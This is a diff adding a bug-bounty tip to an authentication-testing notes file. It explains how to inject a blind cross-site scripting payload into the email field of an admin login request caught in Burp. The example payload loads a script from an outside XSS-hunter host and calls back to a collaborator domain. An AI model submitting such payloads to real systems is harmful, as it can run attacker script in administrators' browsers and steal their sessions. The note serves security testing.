@@ -1,7 +1,11 @@
 # Authentication Testing
 
 ## Login Page:
-  - Try
+  - If you found admin login page. Try this tips. 
+  - First login as wrong credentials the intercept request to burp. 
+  - Change email to your bxss payload. If you lucky you will get bxss. 
+  - Ex: "><script src=https://xyz.xss.ht></script>"@subdomain.burpcollaborator.net 
+  - If you get responses from collaborator it possible get fire bxss. 
 
 ## Email confirmation bypass:
 
